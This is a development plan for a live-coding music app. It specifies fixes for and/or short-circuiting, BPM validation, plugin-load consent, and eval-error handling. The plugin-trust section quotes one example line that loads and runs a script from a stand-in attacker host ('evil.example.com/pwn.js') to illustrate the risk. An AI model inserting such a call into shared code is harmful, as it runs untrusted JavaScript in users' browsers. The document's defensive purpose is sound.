# Phase R0 — Correctness & Safety Fixes

## Goal

Fix a small set of concrete correctness and security issues surfaced in a code
review. Each fix is tightly scoped and independently testable. This phase must
land **before** R1 (the big `app.cljs` refactor) and **before** any of the
Snippet Library epic (S1–S4).

**Why before R1:** fixing bugs during a refactor is the worst time — a test
regression becomes ambiguous (was it the move or the fix?). Land correctness
fixes first on the current stable layout, then refactor.

**Why before S1–S4:** two of the four issues become exploitable the moment
community content exists. BPM crashes and arbitrary plugin URL execution are
tolerable in a solo-user tool; they are **not** acceptable when one user's
snippet can crash or compromise another user's session.

---

## Background

The code review identified four issues. All four are small-to-medium in scope
and can land as a single phase.

### Issue 1 — `and` / `or` do not short-circuit

`eval.cljs` currently registers `and` and `or` as ordinary functions in
`make-env`. Because function arguments are evaluated eagerly, this means:

```clojure
(and (bound? 'x) (some-fn x))
;; → both branches evaluate, so if 'x is unbound, (some-fn x) still runs
;;   and either errors or produces a spurious value
```

Every Lisp in existence treats `and` and `or` as special forms (short-
circuiting). This is not a style issue — it's a semantic bug that breaks
guard patterns users legitimately rely on.

**Reference:** `packages/lisp/src/repulse/lisp/eval.cljs:514`

### Issue 2 — BPM is not validated at the boundary

`(bpm 0)`, `(bpm -1)`, `NaN`, or a garbage value loaded from localStorage flows
unchecked into the scheduler's `cycle-dur` calculation: `(/ 240.0 bpm)`. Zero
produces a division-by-zero (`Infinity`); negative or NaN produces scheduler
instability and undefined UI behaviour.

**Write sites that need validation:**
- `app/src/repulse/audio.cljs:503` — `set-bpm!` / scheduler state write
- `app/src/repulse/session.cljs:76` — session restore from localStorage
- `app/src/repulse/app.cljs:1885` — BPM input handling (slider/command bar)

Today this is a theoretical bug. **After S3** (community snippets), a single
malicious or accidental `(bpm 0)` in a shared snippet crashes every user who
previews it.

### Issue 3 — `load-plugin` has no trust boundary

`load-plugin` dynamically imports arbitrary URLs and executes them in the app
context. In a solo-user tool this is "user-evaluated, user's fault." **But
once code is shared via session URLs (Phase 4, already shipped) or community
snippets (S3), a single shared snippet containing:**

```clojure
(load-plugin "https://evil.example.com/pwn.js")
```

**runs arbitrary JS in the user's browser the moment they click play.** This
is a real supply-chain vulnerability, not a hypothetical one.

**Reference:** `app/src/repulse/app.cljs:746`

### Issue 4 — `{:error "x"}` ambiguity

The top-level evaluator treats any returned map containing an `:error` key as
an execution failure. This means valid user data like `{:error "x"}` cannot
be returned normally:

```clojure
(def err {:error "network down"})
;; → interpreted as eval failure, not a map value
```

Data and control flow are conflated. The fix is to wrap eval errors in a
typed marker the top-level check recognises unambiguously.

**Reference:** `packages/lisp/src/repulse/lisp/core.cljs:17`

---

## Files to change

| File | Change |
|------|--------|
| `packages/lisp/src/repulse/lisp/eval.cljs` | Add `and` / `or` as special forms; remove from `make-env` function table |
| `packages/lisp/src/repulse/lisp/eval_test.cljs` | Tests: short-circuit `(and false (undefined-fn))`, `(or :first :second)`, nested |
| `packages/lisp/src/repulse/lisp/core.cljs` | Replace `{:error msg}` eval-failure sentinel with a typed marker (deftype / defrecord / namespaced keyword) |
| Call sites that pattern-match `:error` | Update to recognise the new marker; audit via grep |
| `app/src/repulse/audio.cljs` | `coerce-bpm` helper; apply at `set-bpm!` (line 503) |
| `app/src/repulse/session.cljs` | Apply `coerce-bpm` on restore (line 76) |
| `app/src/repulse/app.cljs` | Apply `coerce-bpm` at input handler (line 1885); `load-plugin` confirmation dialog |
| `app/src/repulse/session_test.cljs` | **New** — test that corrupt BPM in localStorage is clamped on restore |
| `packages/core/src/repulse/audio_test.cljs` **or** inline test | Test `coerce-bpm` bounds and NaN handling |
| `app/package.json` | Remove unused `svelte` dependency |
| `CLAUDE.md` | Already corrected (Svelte claim, `npm run dev` description) |

---

## Fix specifications

### Fix 1 — `and` / `or` as special forms

In `eval.cljs`, add to the special-form dispatch in `eval-form`:

```clojure
(case op
  ...
  'and (loop [[x & more] args]
         (let [v (eval-form x env)]
           (cond
             (eval-error? v) v        ; propagate errors
             (nil? more)     v
             (falsy? v)      v
             :else           (recur more))))
  'or  (loop [[x & more] args]
         (let [v (eval-form x env)]
           (cond
             (eval-error? v) v
             (nil? more)     v
             (truthy? v)     v
             :else           (recur more))))
  ...)
```

Remove `and` and `or` from `make-env`'s function table. Update
`completions.js` and `hover.js` if they annotate these as functions (they're
still built-ins, just special-form built-ins).

**Test cases:**
- `(and)` → `true`
- `(and false undefined-var)` → `false` (second arg not evaluated)
- `(and :a :b :c)` → `:c`
- `(or)` → `nil`
- `(or nil false :found undefined-var)` → `:found`
- `(or nil)` → `nil`

### Fix 2 — `coerce-bpm`

Add to `audio.cljs` (or a shared util):

```clojure
(defn coerce-bpm
  "Clamp BPM to a musically sensible range. Returns a default (120) for any
  invalid input: non-number, NaN, zero, negative, or out-of-range."
  [x]
  (let [n (if (number? x) x ##NaN)
        n (if (js/isNaN n) 120 n)]
    (cond
      (< n 20)  20
      (> n 400) 400
      :else     n)))
```

Apply at all three write sites. For session restore, log a warning if the
stored value was coerced so silent data corruption is visible in the console.

**Test cases:**
- `(coerce-bpm 120)` → `120`
- `(coerce-bpm 0)` → `120`
- `(coerce-bpm -50)` → `120`
- `(coerce-bpm ##NaN)` → `120`
- `(coerce-bpm 500)` → `400`
- `(coerce-bpm 10)` → `20`
- `(coerce-bpm "abc")` → `120`
- `(coerce-bpm nil)` → `120`

### Fix 3 — `load-plugin` confirmation dialog

In `app.cljs:746` (`load-plugin`):

1. Maintain a `load-plugin-consent` atom: `{origin → :granted | :denied}`.
2. Parse the URL, extract the origin (scheme + host).
3. If origin is in `:granted`, load directly.
4. If origin is in `:denied`, return an eval error with a clear message.
5. If unseen, call `js/confirm` with:
   > "This pattern wants to load a plugin from **{origin}**. Plugins run
   > JavaScript in your browser and can access your session. Only load plugins
   > from sources you trust. Load?"
6. Remember the answer for the rest of the session (not persisted to
   localStorage — per-page-load consent is good enough for MVP).

**Later (S2):** supplement with a CSP header on the Vercel deployment.
**Later (S3):** consider an allowlist of community-trusted plugin origins.

**Test cases:** hard to unit-test because `js/confirm` is a blocking dialog,
but verify manually:
- First load from `https://example.com` → dialog appears
- User clicks OK → plugin loads, second plugin from same origin → no dialog
- User clicks Cancel → plugin rejected, error surfaced, retry asks again
  (denied is per-origin but a user reconsidering should not be silently blocked)
- Invalid/malformed URL → rejected before dialog

### Fix 4 — typed eval-error marker

Replace `{:error msg}` sentinel with a `defrecord` or namespaced marker:

```clojure
(defrecord EvalError [message source])

(defn eval-error? [x] (instance? EvalError x))

(defn eval-error
  ([msg] (->EvalError msg nil))
  ([msg source] (->EvalError msg source)))
```

Audit and update all call sites that currently do:
- `(when (:error result) ...)` → `(when (eval-error? result) ...)`
- `(:error result)` → `(:message result)`
- `{:error msg}` constructors → `(eval-error msg)`

The output footer renderer must still display errors sensibly.

**Test cases:**
- Returning `{:error "x"}` from user code is preserved as a plain map
- A real eval failure is still rendered as an error in the output footer
- `(def err {:error "network down"})` then `err` in REPL shows the map

---

## Definition of done

- [ ] `(and false undefined-var)` evaluates to `false` without error
- [ ] `(or nil false :found undefined-var)` evaluates to `:found` without error
- [ ] `and` / `or` test coverage in `eval_test.cljs`
- [ ] `coerce-bpm` exists, is called at all three write sites
- [ ] `(bpm 0)`, `(bpm -1)`, `(bpm "foo")` all clamp to a sane value without crashing
- [ ] Corrupt BPM in localStorage is clamped on restore (with console warning)
- [ ] `coerce-bpm` has unit tests covering 0, negative, NaN, out-of-range, non-number
- [ ] `load-plugin` shows confirmation dialog on first load per origin
- [ ] Consent is remembered per-origin for the session
- [ ] Invalid plugin URL rejected with a clear error message
- [ ] `{:error "x"}` as user data is preserved in REPL output, not flagged as failure
- [ ] Real eval errors still render in the output footer
- [ ] All call sites that previously matched on `:error` updated to the new marker
- [ ] `svelte` dependency removed from `app/package.json`
- [ ] `npm run test` passes (expect test count to grow by ~10)
- [ ] No bundle-size regressions beyond ±2%
- [ ] Manual smoke test: basic playback, effects, session share, plugin load

---

## Out of scope

- No refactoring of `app.cljs` (that's R1)
- No decomposition of the `eval.cljs` builtin map (that's R2)
- No new features
- No CSP header (deferred to S2)
- No persistent consent storage for `load-plugin` (deferred — session-scoped is enough)
- No changes to `core`, `audio` (Rust), `worklet.js`, or `packages/audio/`

---

## Open questions

1. **Should `eval-error?` be public on the `packages/lisp` API** so the app
   layer can pattern-match without reaching into implementation? **Yes** —
   expose it from `repulse.lisp.core`. Deferrable but trivial.
2. **Should `coerce-bpm` live in `core` or `app`?** Currently no number
   validation exists in `core`. Put it in `audio.cljs` to start; promote to
   `core` if S-phases need it there. **Resolved.**
3. **`load-plugin` deny-list UX**: if a user denies an origin and changes
   their mind, how do they re-enable it? **Resolved for MVP:** they reload
   the page. Per-session scope is intentional.
